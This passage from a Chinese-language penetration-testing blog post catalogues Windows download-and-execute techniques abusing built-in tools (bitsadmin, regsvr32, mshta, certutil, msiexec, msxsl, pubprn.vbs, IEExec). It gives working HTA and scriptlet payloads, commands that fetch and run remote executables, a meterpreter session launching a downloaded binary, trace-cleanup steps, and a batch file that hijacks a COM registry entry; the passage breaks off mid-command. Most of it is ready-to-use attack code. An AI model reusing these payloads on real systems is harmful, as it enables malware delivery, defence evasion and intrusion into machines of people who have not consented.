class=\"comment\">&lt;!--代码与Jsscript相同--&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"undefined\"></span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">var</span> <span class=\"built_in\">Object</span> = <span class=\"keyword\">new</span> ActiveXObject(<span class=\"string\">\"MSXML2.XMLHTTP\"</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"built_in\">Object</span>.open(<span class=\"string\">\"GET\"</span>,<span class=\"string\">\"http://192.168.174.145/ssss2.exe\"</span>,<span class=\"literal\">false</span>);</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"built_in\">Object</span>.send();</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"keyword\">if</span> (<span class=\"built_in\">Object</span>.Status == <span class=\"number\">200</span>)</span></span><br><span class=\"line\"><span class=\"undefined\">    &#123;</span></span><br><span class=\"line\"><span class=\"actionscript\">        <span class=\"keyword\">var</span> Stream = <span class=\"keyword\">new</span> ActiveXObject(<span class=\"string\">\"ADODB.Stream\"</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">        Stream.Open();</span></span><br><span class=\"line\"><span class=\"undefined\">        Stream.Type = 1;</span></span><br><span class=\"line\"><span class=\"javascript\">        Stream.Write(<span class=\"built_in\">Object</span>.ResponseBody);</span></span><br><span class=\"line\"><span class=\"actionscript\">        Stream.SaveToFile(<span class=\"string\">\"C:\\\\test\\\\update\\\\ssss2.exe\"</span>, <span class=\"number\">2</span>);</span></span><br><span class=\"line\"><span class=\"undefined\">        Stream.Close();</span></span><br><span class=\"line\"><span class=\"undefined\">    &#125;</span></span><br><span class=\"line\"><span class=\"javascript\">    <span class=\"built_in\">window</span>.close();</span></span><br><span class=\"line\"><span class=\"undefined\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">HTA:APPLICATION</span> <span class=\"attr\">ID</span>=<span class=\"string\">\"test\"</span> <span class=\"attr\">WINDOWSTATE</span> = <span class=\"string\">\"minimize\"</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span> </span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p>\n<p><br></p>\n<h5 id=\"9-bitsadmin-exe\"><a href=\"#9-bitsadmin-exe\" class=\"headerlink\" title=\"(9) bitsadmin.exe\"></a>(9) bitsadmin.exe</h5><p>描述:下载远程文件并保存指定目录(这里是用户的Download的目录:<code>%Userprofile%\\Downloads</code>)<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; bitsadmin /transfer Downloadjob /download /priority normal http://www.c.cn/logo.gif  %Userprofile%\\Downloads\\png.gif</span><br><span class=\"line\">bitsadmin /transfer n1 /download /priority normal http://127.0.0.1/test.js  C:\\q.zip.js</span><br></pre></td></tr></table></figure><br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190917145014.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#metasploit &gt; meterpreter &gt; shell：</span><br><span class=\"line\">C:\\Windows&gt;bitsadmin &#x2F;transfer Downloadjob &#x2F;download &#x2F;priority normal http:&#x2F;&#x2F;10.7.45.37&#x2F;sb360.exe %systemroot%\\back.exe</span><br><span class=\"line\">C:\\Windows&gt;back.exe</span><br><span class=\"line\">back.exe</span><br></pre></td></tr></table></figure>\n<figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190917145026.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p><br></p>\n<h5 id=\"10-regsvr32-exe\"><a href=\"#10-regsvr32-exe\" class=\"headerlink\" title=\"(10) regsvr32.exe\"></a>(10) regsvr32.exe</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#采用注册表的方式还是比较新颖的</span></span><br><span class=\"line\">regsvr32 /u /s /i:http://site.com/js.png scrobj.dll</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#js.png代码：</span></span><br><span class=\"line\">&lt;?XML version=<span class=\"string\">\"1.0\"</span>?&gt;</span><br><span class=\"line\">&lt;scriptlet&gt;</span><br><span class=\"line\">&lt;registration</span><br><span class=\"line\">    progid=<span class=\"string\">\"ShortJSRAT\"</span></span><br><span class=\"line\">    classid=<span class=\"string\">\"&#123;10001111-0000-0000-0000-0000FEEDACDC&#125;\"</span> &gt;</span><br><span class=\"line\">    &lt;!-- Learn from Casey Smith @subTee --&gt;</span><br><span class=\"line\">    &lt;script language=<span class=\"string\">\"JScript\"</span>&gt;</span><br><span class=\"line\">        &lt;![CDATA[</span><br><span class=\"line\">            ps  = <span class=\"string\">\"cmd.exe /c calc.exe\"</span>;</span><br><span class=\"line\">            new ActiveXObject(<span class=\"string\">\"WScript.Shell\"</span>).Run(ps,0,<span class=\"literal\">true</span>);</span><br><span class=\"line\">        ]]&gt;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">&lt;/registration&gt;</span><br><span class=\"line\">&lt;/scriptlet&gt;</span><br></pre></td></tr></table></figure>\n<p><br></p>\n<h5 id=\"11-mshta-exe\"><a href=\"#11-mshta-exe\" class=\"headerlink\" title=\"(11) mshta.exe\"></a>(11) mshta.exe</h5><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mshta http://site.com/calc.hta</span><br><span class=\"line\">mshta vbscript:Close(Execute(<span class=\"string\">\"GetObject(\"</span><span class=\"string\">\"script:http://webserver/payload.sct\"</span><span class=\"string\">\")\"</span>))</span><br><span class=\"line\">​</span><br><span class=\"line\"><span class=\"comment\">#payload.sct:</span></span><br><span class=\"line\">&lt;?XML version=<span class=\"string\">\"1.0\"</span>?&gt;</span><br><span class=\"line\">&lt;scriptlet&gt;</span><br><span class=\"line\">&lt;registration</span><br><span class=\"line\">    description=<span class=\"string\">\"Bandit\"</span></span><br><span class=\"line\">    progid=<span class=\"string\">\"Bandit\"</span></span><br><span class=\"line\">    version=<span class=\"string\">\"1.00\"</span></span><br><span class=\"line\">    classid=<span class=\"string\">\"&#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;\"</span></span><br><span class=\"line\">    remotable=<span class=\"string\">\"true\"</span></span><br><span class=\"line\">    &gt;</span><br><span class=\"line\">&lt;/registration&gt;</span><br><span class=\"line\">​</span><br><span class=\"line\">&lt;script language=<span class=\"string\">\"JScript\"</span>&gt;</span><br><span class=\"line\">&lt;![CDATA[</span><br><span class=\"line\">        var r = new ActiveXObject(<span class=\"string\">\"WScript.Shell\"</span>).Run(<span class=\"string\">\"calc.exe\"</span>);</span><br><span class=\"line\">]]&gt;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#calc.hta</span></span><br><span class=\"line\">&lt;HTML&gt; </span><br><span class=\"line\">    &lt;meta http-equiv=<span class=\"string\">\"Content-Type\"</span> content=<span class=\"string\">\"text/html; charset=utf-8\"</span>&gt;</span><br><span class=\"line\">    &lt;HEAD&gt; </span><br><span class=\"line\">    &lt;script language=<span class=\"string\">\"VBScript\"</span>&gt;</span><br><span class=\"line\">        Window.ReSizeTo 0, 0</span><br><span class=\"line\">        Window.moveTo -2000,-2000</span><br><span class=\"line\">        Set objShell = CreateObject(<span class=\"string\">\"Wscript.Shell\"</span>)</span><br><span class=\"line\">        objShell.Run <span class=\"string\">\"calc.exe\"</span></span><br><span class=\"line\">        self.close</span><br><span class=\"line\">    &lt;/script&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">    demo</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;/HEAD&gt; </span><br><span class=\"line\">&lt;/HTML&gt;</span><br></pre></td></tr></table></figure>\n<p><br></p>\n<h5 id=\"12-certutil-exe\"><a href=\"#12-certutil-exe\" class=\"headerlink\" title=\"(12) certutil.exe\"></a>(12) certutil.exe</h5><p>描述：certutil在渗透测试中的应用，对cmd下downloader的实现方法作补充。<br>certutil 用于备份证书服务管理,支持xp-win10；更多操作说明见<a href=\"https://technet.microsoft.com/zh-cn/library/cc755341(v=ws.10).aspx\" target=\"_blank\" rel=\"noopener\">https://technet.microsoft.com/zh-cn/library/cc755341(v=ws.10).aspx</a></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#保存在当前路径，文件名称和下载文件名称相同</span></span><br><span class=\"line\">certutil -urlcache -split -f http://127.0.0.1/current.inf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#保存在当前路径，指定保存文件名称</span></span><br><span class=\"line\">certutil -urlcache -split -f http://127.0.0.1/current.inf demo.inf</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#保存在缓存目录，名称随机</span></span><br><span class=\"line\">certutil -urlcache -f </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#战场清理(缓存清理)</span></span><br><span class=\"line\">查看缓存项目：certutil.exe -urlcache *</span><br><span class=\"line\">certutil -urlcache -f http://127.0.0.1/current.inf delete</span><br></pre></td></tr></table></figure>\n<figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190917160633.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p><br></p>\n<h5 id=\"13-msiexec\"><a href=\"#13-msiexec\" class=\"headerlink\" title=\"(13) msiexec\"></a>(13) msiexec</h5><p>描述:msiexec是一个windows installer MSI的安装程序</p>\n<blockquote>\n<p>msfvenom -f msi -p windows/exec CMD=calc.exe &gt; cacl.png<br>msiexec /q /i <a href=\"http://site.com/payloads/calc.png\" target=\"_blank\" rel=\"noopener\">http://site.com/payloads/calc.png</a> </p>\n</blockquote>\n<p><br></p>\n<h5 id=\"14-IEExec-exe\"><a href=\"#14-IEExec-exe\" class=\"headerlink\" title=\"(14) IEExec.exe\"></a>(14) IEExec.exe</h5><blockquote>\n<p>C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727> caspol -s off<br>C:\\Windows\\Microsoft.NET\\Framework\\v2.0.50727> IEExec <a href=\"http://site.com/files/test64.exe\" target=\"_blank\" rel=\"noopener\">http://site.com/files/test64.exe</a></p>\n</blockquote>\n<figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190917150827.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p><br></p>\n<h5 id=\"15-EXPLORE-exe\"><a href=\"#15-EXPLORE-exe\" class=\"headerlink\" title=\"(15) EXPLORE.exe\"></a>(15) EXPLORE.exe</h5><p>描述:这个需要IE存在可执行命令的漏洞(exp可以使用类似ms14_064)<br>“C:\\Program Files\\Internet Explorer\\IEXPLORE.EXE” <a href=\"http://site.com/exp\" target=\"_blank\" rel=\"noopener\">http://site.com/exp</a></p>\n<p><br></p>\n<h5 id=\"16-Cscript-Wscript\"><a href=\"#16-Cscript-Wscript\" class=\"headerlink\" title=\"(16) Cscript/Wscript\"></a>(16) Cscript/Wscript</h5><blockquote>\n<p>cscript //E:jscript \\webdavserver\\folder\\payload.txt</p>\n</blockquote>\n<p><br></p>\n<h5 id=\"17-​Regasm-Regsvc\"><a href=\"#17-​Regasm-Regsvc\" class=\"headerlink\" title=\"(17) ​Regasm/Regsvc\"></a>(17) ​Regasm/Regsvc</h5><p>描述: dll可以使用C#写的</p>\n<blockquote>\n<p>C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\regasm.exe /u \\webdavserver\\folder\\payload.dll</p>\n</blockquote>\n<p><br></p>\n<h5 id=\"19-第三方软件下载\"><a href=\"#19-第三方软件下载\" class=\"headerlink\" title=\"(19) 第三方软件下载\"></a>(19) 第三方软件下载</h5><p>这里介绍的思路是可先通过bitsadmin来下载第三方工具，然后利用第三方工具进行传输文件</p>\n<p><strong>1)wget</strong><br>bitsadmin /transfer n <a href=\"http://www.interlog.com/~tcharron/wgetwin-1_5_3_1-binary.zip\" target=\"_blank\" rel=\"noopener\">http://www.interlog.com/~tcharron/wgetwin-1_5_3_1-binary.zip</a> C:\\test\\update\\wget.zip<br>运行后会下载wget的压缩包wget.zip<br>注：Windows系统默认不包含解压缩zip文件的命令，但是可以通过vbs来实现解压缩zip文件<br>vbs实现解压缩,以下代码保存为.vbs文件：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">UnZip &quot;C:\\test\\update\\wget.zip&quot;,&quot;C:\\test\\update\\wget\\&quot;</span><br><span class=\"line\">Sub UnZip(ByVal myZipFile, ByVal myTargetDir)</span><br><span class=\"line\">    Set fso &#x3D; CreateObject(&quot;Scripting.FileSystemObject&quot;)</span><br><span class=\"line\">    If NOT fso.FileExists(myZipFile) Then</span><br><span class=\"line\">        Exit Sub</span><br><span class=\"line\">    ElseIf fso.GetExtensionName(myZipFile) &lt;&gt; &quot;zip&quot; Then</span><br><span class=\"line\">        Exit Sub</span><br><span class=\"line\">    ElseIf NOT fso.FolderExists(myTargetDir) Then</span><br><span class=\"line\">        fso.CreateFolder(myTargetDir)</span><br><span class=\"line\">    End If</span><br><span class=\"line\">    Set objShell &#x3D; CreateObject(&quot;Shell.Application&quot;)</span><br><span class=\"line\">    Set objSource &#x3D; objShell.NameSpace(myZipFile)</span><br><span class=\"line\">    Set objFolderItem &#x3D; objSource.Items()</span><br><span class=\"line\">    Set objTarget &#x3D; objShell.NameSpace(myTargetDir)</span><br><span class=\"line\">    intOptions &#x3D; 256</span><br><span class=\"line\">    objTarget.CopyHere objFolderItem, intOptions</span><br><span class=\"line\">End Sub</span><br></pre></td></tr></table></figure><br>成功解压缩后就可通过wget.exe来传输文件<br>C:\\test\\update\\wget\\wget.exe <a href=\"http://192.168.174.145/ssss2.exe\" target=\"_blank\" rel=\"noopener\">http://192.168.174.145/ssss2.exe</a><br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190917150846.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure></p>\n<p><br></p>\n<p><strong>2) ftfp</strong><br>思路同上，先通过bitsadmin下载tftp.exe，然后利用tftp传输文件<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bitsadmin &#x2F;transfer n http:&#x2F;&#x2F;www.winagents.com&#x2F;downloads&#x2F;tftp.exe C:\\test\\update\\tftp.exe</span><br><span class=\"line\">​</span><br><span class=\"line\">tftp -i 192.168.174.151 GET tftp\\ssss2.exe C:\\test\\update\\ssss2.exe</span><br></pre></td></tr></table></figure></p>\n<figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190917150857.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p><br></p>\n<p><strong>3）Python</strong></p>\n<p>相当于把Python脚本进行base64编码然后重新解码执行<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c <span class=\"string\">\"import urllib2; exec urllib2.urlopen('http://site.com/abc').read();\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> base64; <span class=\"keyword\">exec</span> base64.b64decode(<span class=\"string\">\"aW1wb=\"</span>)</span><br></pre></td></tr></table></figure></p>\n<figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190917150953.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure>\n<p><br></p>\n<p><strong>4)msxsl.exe</strong></p>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msxsl https://evi1cg.me/scripts/demo.xml https://evi1cg.me/scripts/exec.xs</span><br><span class=\"line\"></span><br><span class=\"line\">demo.xml：</span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version=\"1.0\"?&gt;</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?xml-stylesheet type=\"text/xsl\" href=\"exec.xsl\" ?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">customers</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">customer</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span>Microsoft<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">customer</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">customers</span>&gt;</span></span><br><span class=\"line\">​</span><br><span class=\"line\">​</span><br><span class=\"line\">exec.xsl：</span><br><span class=\"line\"><span class=\"meta\">&lt;?xml version='1.0'?&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">xsl:stylesheet</span> <span class=\"attr\">version</span>=<span class=\"string\">\"1.0\"</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"attr\">xmlns:xsl</span>=<span class=\"string\">\"http://www.w3.org/1999/XSL/Transform\"</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"attr\">xmlns:msxsl</span>=<span class=\"string\">\"urn:schemas-microsoft-com:xslt\"</span></span></span><br><span class=\"line\"><span class=\"tag\"><span class=\"attr\">xmlns:user</span>=<span class=\"string\">\"http://mycompany.com/mynamespace\"</span>&gt;</span> <span class=\"comment\">&lt;!--关键点--&gt;</span></span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">msxsl:script</span> <span class=\"attr\">language</span>=<span class=\"string\">\"JScript\"</span> <span class=\"attr\">implements-prefix</span>=<span class=\"string\">\"user\"</span>&gt;</span></span><br><span class=\"line\">   function xml(nodelist) &#123;</span><br><span class=\"line\">    var r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd /c calc.exe\");</span><br><span class=\"line\">    return nodelist.nextNode().xml;</span><br><span class=\"line\">   &#125;</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">msxsl:script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">xsl:template</span> <span class=\"attr\">match</span>=<span class=\"string\">\"/\"</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">xsl:value-of</span> <span class=\"attr\">select</span>=<span class=\"string\">\"user:xml(.)\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">xsl:template</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><br></p>\n<p><strong>5)pubprn.vbs</strong><br>描述:下载劫持com的sct的批处理文件<br><figure class=\"image-box\">\n                <img src=\"https://img.weiyigeek.top/2019/1/20190917150815.png\" alt=\"WeiyiGeek.\" title=\"\" class=\"\">\n                <p>WeiyiGeek.</p>\n            </figure><br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">cscript /b C:\\Windows\\System32\\Printing_Admin_Scripts\\zh-CN\\pubprn.vbs 127.0.0.1 script:https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#test.sct</span></span><br><span class=\"line\">&lt;?XML version=<span class=\"string\">\"1.0\"</span>?&gt;</span><br><span class=\"line\">&lt;scriptlet&gt;</span><br><span class=\"line\">&lt;registration</span><br><span class=\"line\">    description=<span class=\"string\">\"Bandit\"</span></span><br><span class=\"line\">    progid=<span class=\"string\">\"Bandit\"</span></span><br><span class=\"line\">    version=<span class=\"string\">\"1.00\"</span></span><br><span class=\"line\">    classid=<span class=\"string\">\"&#123;AAAA1111-0000-0000-0000-0000FEEDACDC&#125;\"</span></span><br><span class=\"line\">    remotable=<span class=\"string\">\"true\"</span></span><br><span class=\"line\">    &gt;</span><br><span class=\"line\">&lt;/registration&gt;</span><br><span class=\"line\">​</span><br><span class=\"line\">&lt;script language=<span class=\"string\">\"JScript\"</span>&gt;</span><br><span class=\"line\">&lt;![CDATA[</span><br><span class=\"line\">        var r = new ActiveXObject(<span class=\"string\">\"WScript.Shell\"</span>).Run(<span class=\"string\">\"calc.exe\"</span>);</span><br><span class=\"line\">]]&gt;</span><br><span class=\"line\">&lt;/script&gt;</span><br><span class=\"line\">​</span><br><span class=\"line\">&lt;/scriptlet&gt;</span><br></pre></td></tr></table></figure></p>\n<p>test.bat(这里批处理是利用到certutil下载sct文件劫持com弹出计算器）：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@<span class=\"built_in\">echo</span> off</span><br><span class=\"line\">reg add HKEY_CURRENT_USER\\SOFTWARE\\Classes\\Bandit.1.00 /ve /t REG_SZ /d Bandit /f 1&gt;nul 2&gt;&amp;1</span><br><span class=\"line\">reg add HKEY_CURRENT_USER\\SOFTWARE\\Classes\\Bandit.1.00\\CLSID /ve /t REG_SZ /d &#123;00000001-0000-0000-0000-0000FEEDACDC&#125; /f 1&gt;nul 2&gt;&amp;1</span><br><span class=\"line\">reg add HKEY_CURRENT_USER\\SOFTWARE\\Classes\\Bandit /ve /t REG_SZ /d Bandit /f 1&gt;nul 2&gt;&amp;1</span><br><span class=\"line\">reg add HKEY_CURRENT_USER\\SOFTWARE\\Classes\\Bandit\\CLSID /ve /t REG_SZ /d &#123;00000001-0000-0000-0000-0000FEEDACDC&#125; /f 1&gt;nul 2&gt;&amp;1</span><br><span class=\"line\">reg add HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\&#123;00000001-0000-0000-0000-0000FEEDACDC&#125; /ve /t REG_SZ /d Bandit /f 1&gt;nul 2&gt;&amp;1</span><br><span class=\"line\">reg add HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;\\InprocServer32 /ve /t REG_SZ /d C:\\WINDOWS\\system32\\scrobj.dll /f 1&gt;nul 2&gt;&amp;1</span><br><span class=\"line\">reg add HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;\\InprocServer32 /v ThreadingModel  /t REG_SZ /d Apartment /f 1&gt;nul 2&gt;&amp;1</span><br><span class=\"line\">reg add HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;\\ProgID /ve /t REG_SZ /d Bandit.1.00 /f 1&gt;nul 2&gt;&amp;1</span><br><span class=\"line\">reg add HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;\\ScriptletURL /ve /t REG_SZ /d https://gist.githubusercontent.com/enigma0x3/64adf8ba99d4485c478b67e03ae6b04a/raw/a006a47e4075785016a62f7e5170ef36f5247cdb/test.sct /f 1&gt;nul 2&gt;&amp;1</span><br><span class=\"line\">reg add HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\&#123;00000001-0000-0000-0000-0000FEEDACDC&#125;\\VersionIndependentProgID /ve /t REG_SZ /d Bandit /f 1&gt;nul 2&gt;&amp;1</span><br><span class=\"line\">reg add HKEY_CURRENT_USER\\SOFTWARE\\Classes\\CLSID\\&#123;372FCE38-4324-11D0-8810-00A0C903B83C&#125;\\TreatAs /ve /t REG_SZ /d &#123;00000001-0000-0000-0000-0000FEEDACDC&#125; /f 1&gt;nul 2&gt;&amp;1</span><br><span class=\"line\"></span><br><span class=\"line\">certutil 1&gt;nul 2&gt;&amp;1</span><br><span class=\"line\">reg delete HKEY_CURRENT_USER\\SOFTWARE\\Classes\\Bandit.1.00 /f 1&gt;nul 2&gt;&amp;1</span><br><span class=\"line\">reg delete HKEY_CURRENT_USER\\SOFTWARE\\Classes\\Bandit /f 1&gt;nul 2&gt;&amp;1</span><br><span class=\"line\">reg delete 